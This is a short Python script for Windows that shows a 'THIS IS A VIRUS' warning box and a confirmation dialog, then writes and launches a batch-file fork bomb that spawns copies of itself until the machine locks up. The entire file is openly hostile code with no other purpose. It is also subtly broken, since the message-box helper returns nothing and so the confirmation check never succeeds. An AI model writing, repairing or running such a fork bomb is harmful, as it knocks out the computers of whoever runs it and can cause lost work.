import os
import ctypes
import subprocess

# Function to show a message box
def show_message_box(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Warning", 1)

# Show initial warning
show_message_box("THIS IS A VIRUS. NO JOKE.")

# Show confirmation dialog
if show_message_box("Are you sure you want to continue?") == 1:
    # Create a.bat file with a fork bomb
    with open('a.bat', 'w') as f:
        f.write('@echo off\n:start\nstart %0\ngoto start\n')
    # Run the fork bomb
    subprocess.Popen(['a.bat'])
else:
    exit()